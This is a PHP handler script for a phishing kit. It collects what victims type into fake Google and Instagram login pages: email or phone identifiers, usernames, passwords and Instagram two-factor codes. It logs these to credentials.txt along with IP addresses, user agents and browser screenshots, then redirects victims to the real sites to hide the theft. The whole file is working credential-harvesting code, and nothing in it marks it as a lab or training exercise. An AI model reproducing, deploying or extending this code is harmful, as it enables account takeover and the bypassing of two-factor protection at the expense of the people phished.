<?php
session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

// Configuration
$logFile = 'credentials.txt';
$screenshotDir = 'screenshots/';
$finalRedirectUrlGoogle = 'https://myaccount.google.com/'; // Official Google Account URL
$finalRedirectUrlInstagram = 'https://www.instagram.com/'; // Official Instagram URL

// Ensure screenshot directory exists
if (!is_dir($screenshotDir)) {
    mkdir($screenshotDir, 0777, true);
}

// Get client IP and User-Agent
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Determine template name
$template_name = 'unknown';
if (isset($_POST['template_name'])) {
    $template_name = $_POST['template_name'];
    $_SESSION['template_name'] = $template_name; // Store in session for multi-step
} elseif (isset($_SESSION['template_name'])) {
    $template_name = $_SESSION['template_name'];
}

// Function to log data
function log_data($data, $logFile) {
    file_put_contents($logFile, $data . "\n", FILE_APPEND | LOCK_EX);
}

// Function to save screenshot
function save_screenshot($imageData, $screenshotDir, $prefix = 'screenshot') {
    if (preg_match('/^data:image\/png;base64,/', $imageData)) {
        $imageData = substr($imageData, strpos($imageData, ',') + 1);
        $imageData = base64_decode($imageData);
        $filename = uniqid($prefix . '_') . '.png';
        file_put_contents($screenshotDir . $filename, $imageData);
        return $filename;
    }
    return null;
}

// Initialize data array
$logData = [
    'Timestamp' => $timestamp,
    'IP' => $ip,
    'User-Agent' => $userAgent,
    'Template' => $template_name,
];

$redirectUrl = '';

switch ($template_name) {
    case 'google':
        // Google Step 1: Email/Phone submission
        if (isset($_POST['identifier']) && !isset($_POST['password'])) {
            $identifier = htmlspecialchars($_POST['identifier']);
            $logData['Identifier'] = $identifier;
            log_data(json_encode($logData), $logFile);

            // Redirect to Google's password page, passing identifier
            $redirectUrl = 'templates/google/next.html?identifier=' . urlencode($identifier);
        }
        // Google Step 2: Password submission
        elseif (isset($_POST['identifier']) && isset($_POST['password'])) {
            $identifier = htmlspecialchars($_POST['identifier']);
            $password = htmlspecialchars($_POST['password']);
            $screenshotFilename = null;

            $logData['Identifier'] = $identifier;
            $logData['Password'] = $password;

            if (isset($_POST['screenshot_data'])) {
                $screenshotFilename = save_screenshot($_POST['screenshot_data'], $screenshotDir, 'google');
                $logData['Screenshot'] = $screenshotFilename ? $screenshotDir . $screenshotFilename : 'N/A';
            }

            log_data(json_encode($logData), $logFile);

            // Clear session for next attempt
            session_destroy();
            $redirectUrl = $finalRedirectUrlGoogle;
        }
        break;

    case 'instagram':
        // Instagram Step 1: Username/Password submission
        if (isset($_POST['username']) && isset($_POST['password']) && !isset($_POST['2fa_code'])) {
            $username = htmlspecialchars($_POST['username']);
            $password = htmlspecialchars($_POST['password']);
            $two_fa_required = isset($_POST['2fa_required']) && $_POST['2fa_required'] === 'true';
            $screenshotFilename = null;

            $logData['Username'] = $username;
            $logData['Password'] = $password;
            if (isset($_POST['screenshot_data'])) {
                $screenshotFilename = save_screenshot($_POST['screenshot_data'], $screenshotDir, 'instagram_login');
                $logData['Screenshot'] = $screenshotFilename ? $screenshotDir . $screenshotFilename : 'N/A';
            }

            log_data(json_encode($logData), $logFile);

            if ($two_fa_required) {
                // Redirect to 2FA page, passing username and password
                $redirectUrl = 'templates/instagram/2fa.html?username=' . urlencode($username) . '&password=' . urlencode($password);
            } else {
                // Clear session for next attempt
                session_destroy();
                $redirectUrl = $finalRedirectUrlInstagram;
            }
        }
        // Instagram Step 2: 2FA Code submission
        elseif (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['2fa_code'])) {
            $username = htmlspecialchars($_POST['username']);
            $password = htmlspecialchars($_POST['password']);
            $two_fa_code = htmlspecialchars($_POST['2fa_code']);
            $screenshotFilename = null;

            $logData['Username'] = $username;
            $logData['Password'] = $password;
            $logData['2FA_Code'] = $two_fa_code;

            if (isset($_POST['screenshot_data'])) {
                $screenshotFilename = save_screenshot($_POST['screenshot_data'], $screenshotDir, 'instagram_2fa');
                $logData['Screenshot'] = $screenshotFilename ? $screenshotDir . $screenshotFilename : 'N/A';
            }

            log_data(json_encode($logData), $logFile);

            // Clear session for next attempt
            session_destroy();
            $redirectUrl = $finalRedirectUrlInstagram;
        }
        break;

    default:
        // Handle unknown or direct access
        $logData['Status'] = 'Direct Access or Unknown Template';
        log_data(json_encode($logData), $logFile);
        $redirectUrl = 'about:blank'; // Or a default safe page
        break;
}

if ($redirectUrl) {
    header("Location: " . $redirectUrl);
    exit();
} else {
    // Fallback if no specific redirect was set
    log_data(json_encode(array_merge($logData, ['Status' => 'No Specific Redirect'])), $logFile);
    header("Location: about:blank");
    exit();
}
?>
